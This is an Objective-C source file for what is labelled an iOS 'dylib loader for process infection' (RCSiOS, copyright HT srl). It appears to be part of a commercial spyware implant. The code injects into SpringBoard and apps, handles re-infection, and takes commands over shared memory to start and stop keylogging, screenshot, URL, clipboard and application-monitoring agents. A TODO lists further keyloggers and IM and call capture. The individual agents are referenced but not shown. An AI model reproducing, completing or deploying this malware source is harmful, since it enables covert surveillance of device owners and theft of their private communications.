/*
 * RCSiOS - dylib loader for process infection
 *  pon pon 
 *
 * [QUICK TODO]
 * - Cocoa Keylogger
 * - Cocoa Mouse logger
 * - URLGrabber
 *   - Safari
 * - IM (Skype/Nimbuzz/...)
 *   - Text
 *   - Call
 * - MobilePhone
 *
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIApplication.h>
#import <objc/runtime.h>
#import <unistd.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <sys/mman.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSIDylib.h"
#import "RCSISharedMemory.h"
#import "RCSIDylibEvents.h"
#import "RCSIEventStandBy.h"
#import "RCSIAgentApplication.h"
#import "RCSIAgentInputLogger.h"
#import "RCSIAgentScreenshot.h"
#import "RCSIAgentURL.h"
#import "RCSIAgentPasteboard.h"

#import "ARMHooker.h"

//#define DEBUG
//#define __DEBUG_IOS_DYLIB

#define CAMERA_APP    @"com.apple.camera"
#define CAMERA_APP_40 @"com.apple.mobileslideshow"
#define DYLIB_MODULE_RUNNING 1
#define DYLIB_MODULE_STOPPED 0

static BOOL gInitAlreadyRunned  = FALSE;
static char gDylibPath[256];

#ifdef __DEBUG_IOS_DYLIB
/*
 * -- only for debugging purpose
 */

void catch_me();
/*
 * --
 */
#endif

extern "C" void init();
extern "C" void checkInit(char *dylibName);

static void TurnWifiOn(CFNotificationCenterRef center, 
                       void *observer,
                       CFStringRef name, 
                       const void *object,
                       CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = nil; 
  antani = [wifiManager performSelector: @selector(sharedInstance)];
  //[antani setWiFiEnabled: YES];
}

static void TurnWifiOff(CFNotificationCenterRef center, 
                        void *observer,
                        CFStringRef name, 
                        const void *object,
                        CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = nil;
  antani = [wifiManager performSelector: @selector(sharedInstance)];
  //[antani setWiFiEnabled: NO];
}

#pragma mark -
#pragma mark - entry point
#pragma mark -

/*
 * dylib entry point
 */
extern "C" void init()
{
  NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
  
  gInitAlreadyRunned = TRUE;
  
  dylibModule *dyilbMod = [[dylibModule alloc] init];

#ifdef __DEBUG_IOS_DYLIB
  /*
   * -- only for debugging purpose
   */
  
    catch_me();
    [NSThread detachNewThreadSelector: @selector(dylibMainRunLoop)
                             toTarget: dyilbMod
                           withObject: nil];
  /*
   * --
   */
#else
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([bundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
    {
      [dyilbMod threadDylibMainRunLoop];
    }
  else
    {
      [[NSNotificationCenter defaultCenter] addObserver: dyilbMod
                                               selector: @selector(threadDylibMainRunLoop)
                                                   name: UIApplicationDidFinishLaunchingNotification
                                                 object: nil];
    }
#endif
  
  [pool drain];
}

/*
 * runned by injected thread for SB re-infection
 */
extern "C" void checkInit(char *dylibName)
{
  if (dylibName != NULL)
    snprintf(gDylibPath, sizeof(gDylibPath), "%s", dylibName);

  usleep(1500);
  
  if (gInitAlreadyRunned == FALSE)
    {
      init();
    }
}

#ifdef __DEBUG_IOS_DYLIB
/*
 * -- only for debugging purpose
 */

void catch_me()
{
  int i = 0;
  i++;
  return;
}

/*
 * --
 */
#endif

@implementation dylibModule

@synthesize mAgentsArray;
@synthesize mEventsArray;
@synthesize mConfigId;

#pragma mark -
#pragma mark - initialization 
#pragma mark -

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mEventsArray = [[NSMutableArray alloc] initWithCapacity:0];
      mAgentsArray = [[NSMutableArray alloc] initWithCapacity:0];
      mConfigId          = 0;
      mMainThreadRunning = TRUE;
      mDylibName         = nil;
    }
  
  return self;
}

#pragma mark -
#pragma mark - Notification 
#pragma mark -

- (void)sendNeedConfigRefresh
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *theData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[theData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = DYLIB_CONF_REFRESH;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = getpid();
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob: theData];
  
  [theData release];
  
  [pool release];
  
}

+ (void)triggerCamera:(UInt32)startStop
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *theData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[theData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_CAMERA_APP;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = startStop;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob: theData];
  
  [theData release];
  
  [pool release];
}

- (void)sendAsyncBgNotification
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
    [dylibModule triggerCamera:2];
    }
}

- (void)sendAsyncFgNotification
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
    [dylibModule triggerCamera:1];
    }
}

- (void)sendAsyncInitNotification
{
  [self sendAsyncFgNotification];
}

- (void)dylibApplicationWillEnterForeground
{
  [self sendAsyncFgNotification];
  [self sendNeedConfigRefresh];
}

- (void)dylibApplicationWillEnterBackground
{
  [self sendAsyncBgNotification];
}

- (void)registerAppNotification
{
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterForeground)
                                               name: @"UIApplicationWillEnterForegroundNotification"
                                             object: nil];
  
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterBackground)
                                               name: @"UIApplicationDidEnterBackgroundNotification"
                                             object: nil];  
  // only for 4.0
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(dylibApplicationWillEnterBackground)
                                               name: @"UIApplicationWillTerminateNotification"
                                             object: nil];
  // Install a callback in order to be able to force wifi on and off
  // before/after syncing
  //  CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
  //                                  NULL,
  //                                  &TurnWifiOn,
  //                                  CFSTR("com.apple.Preferences.WiFiOn"),
  //                                  NULL, 
  //                                  CFNotificationSuspensionBehaviorCoalesce); 
  //  
  //  CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
  //                                  NULL,
  //                                  &TurnWifiOff,
  //                                  CFSTR("com.apple.Preferences.WiFiOff"),
  //                                  NULL, 
  //                                  CFNotificationSuspensionBehaviorCoalesce);
}

#pragma mark -
#pragma mark - Event management 
#pragma mark -

- (dylibEvents*)eventAllocate:(RCSIDylibBlob*)aBlob
{
  dylibEvents *event = nil;
  
  switch ([aBlob type]) 
  {
    case EVENT_STANDBY:
      event = [[eventStandBy alloc] init];
    break;
  }
  return event;
}

- (dylibEvents*)getEventFromBlob:(RCSIDylibBlob*)aBlob
{
  dylibEvents *event = nil;
  
  uint eventId = [aBlob type];
  
  for (int i=0; i < [mEventsArray count]; i++) 
    {
      id eventTmp = [mEventsArray objectAtIndex:i];
      if (eventId == [eventTmp mEventID])
        {
          event = eventTmp;
          break;
        }
    }
  
  if (event == nil)
    {
      event = [self eventAllocate:aBlob];
      [mEventsArray addObject:event];
    }
  
  return event;
}

- (void)stopAllEvents
{
  for (int i=0; i < [mEventsArray count]; i++) 
    {
      dylibEvents *eventTmp = [mEventsArray objectAtIndex:i];
      [eventTmp stop];
    }
}

- (void)startEvent:(RCSIDylibBlob*)aBlob
{
  dylibEvents *event = [self getEventFromBlob:aBlob];
  [event start];
}

- (void)stopEvent:(RCSIDylibBlob*)aBlob
{
  dylibEvents *event = [self getEventFromBlob:aBlob];
  [event stop];
}

#pragma mark -
#pragma mark - Agents management 
#pragma mark -

- (RCSIAgent*)agentAllocate:(RCSIDylibBlob*)aBlob
{
  RCSIAgent *agent = nil;
  
  switch ([aBlob type]) 
  {
    case AGENT_URL:
      agent = [[agentURL alloc] init];
    break;
    case AGENT_APPLICATION:
      agent = [[agentApplication alloc] init];
    break;
    case AGENT_KEYLOG:
      agent = [[agentKeylog alloc] init];
    break;
    case AGENT_CLIPBOARD:
      agent = [[agentPasteboard alloc] init];
    break;
    case AGENT_SCREENSHOT:
      agent = [[agentScreenshot alloc] init];
    break;
  }
  return agent;
}

- (RCSIAgent*)getAgentFromBlob:(RCSIDylibBlob*)aBlob
{
  RCSIAgent *agent = nil;
  
  uint agentId = [aBlob type];
  
  for (int i=0; i < [mAgentsArray count]; i++) 
    {
      id agentTmp = [mAgentsArray objectAtIndex:i];
      if (agentId == [agentTmp mAgentID])
        {
          agent = agentTmp;
          break;
        }
    }
  
  if (agent == nil)
    {
      agent = [self agentAllocate:aBlob];
      [mAgentsArray addObject:agent];
    }
  
  return agent;
}

- (void)stopAllAgents
{
  for (int i=0; i < [mAgentsArray count]; i++) 
    {
      RCSIAgent *agentTmp = [mAgentsArray objectAtIndex:i];
      [agentTmp stop];
    }
}

- (void)startAgent:(RCSIDylibBlob*)aBlob
{
  RCSIAgent *agent = [self getAgentFromBlob:aBlob];
  [agent start];
}

- (void)stopAgent:(RCSIDylibBlob*)aBlob
{
  RCSIAgent *agent = [self getAgentFromBlob:aBlob];
  [agent stop];
}

- (void)setDylibName:(RCSIDylibBlob*)aBlob
{
  blob_t *_Blob = (blob_t*)[[aBlob blob] bytes];
  
  if (_Blob->size > 0)
    mDylibName = [[NSString alloc] initWithCString:_Blob->blob 
                                          encoding:NSUTF8StringEncoding];
}

#pragma mark -
#pragma mark - Blobs management 
#pragma mark -

- (void)checkAndUpdateConfigId:(RCSIDylibBlob*)aBlob
{
  if ([aBlob configId] > mConfigId)
    {
      mConfigId = [aBlob configId];
      [self stopAllEvents];
      [self stopAllAgents];
    }
}

- (void)doit:(RCSIDylibBlob*)aBlob
{
  switch ([aBlob type]) 
  {
    case AGENT_SCREENSHOT:
    case AGENT_URL:
    case AGENT_APPLICATION:
    case AGENT_KEYLOG:
    case AGENT_CLIPBOARD:
      if ([aBlob getAttribute: DYLIB_AGENT_START_ATTRIB] == TRUE)
          [self startAgent: aBlob];
      else
          [self stopAgent: aBlob];
    break;
    case EVENT_STANDBY:
      if ([aBlob getAttribute: DYLIB_EVENT_START_ATTRIB] == TRUE)
        [self startEvent: aBlob];
      else
        [self stopEvent: aBlob];
    break;
    case DYLIB_NEED_UNINSTALL:
      mMainThreadRunning = DYLIB_MODULE_STOPPED;
      [self setDylibName:aBlob];
    break;
  }
}

- (void)processIncomingBlobs
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *blobs = [[RCSISharedMemory sharedInstance] getBlobs];
  id blob = nil;
  
  for (int i=0; i < [blobs count]; i++) 
    {
      blob = [blobs objectAtIndex:i];
      if (blob != nil)
        {
          [self checkAndUpdateConfigId:blob];
          [self doit:blob];
        }
    }
  [pool release];
}

#pragma mark -
#pragma mark - runloop 
#pragma mark -

- (void)checkDylibFile
{  
  if (mDylibName != nil)
    {
     if ([[NSFileManager defaultManager] fileExistsAtPath:mDylibName] == FALSE)
       mMainThreadRunning = DYLIB_MODULE_STOPPED;
    }
  else
    {
      if (strlen(gDylibPath))
        {
          mDylibName = [[NSString alloc] initWithBytes: gDylibPath 
                                                length:strlen(gDylibPath) 
                                              encoding:NSUTF8StringEncoding];
        }
    }
}

- (void)dylibMainRunLoop;
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSISharedMemory *sharedMem = [RCSISharedMemory sharedInstance];
  
  if ([sharedMem createDylibRLSource] != kRCS_SUCCESS)
    return;
    
  /*
   * camera app, etc.
   */
  [self registerAppNotification];
  [self sendAsyncInitNotification];
  
  do 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow:1.00]];
    
      [self processIncomingBlobs];
    
      [self checkDylibFile];
    
      [inner release];
    }
  while (mMainThreadRunning == DYLIB_MODULE_RUNNING); 
  
  /*
   *  stop all agents, close all ipc ports etc...
   */  
  unsetenv("DYLD_INSERT_LIBRARIES");
  
  [self stopAllAgents];
  [self stopAllEvents];
  
  gInitAlreadyRunned = FALSE;
  
  [pool release];
}

/*
 * notify by UIApplicationDidFinishLaunchingNotification 
 * (only for app launched by SB)
 */
- (void)threadDylibMainRunLoop
{
  [NSThread detachNewThreadSelector: @selector(dylibMainRunLoop)
                           toTarget: self
                         withObject: nil];
}

@end
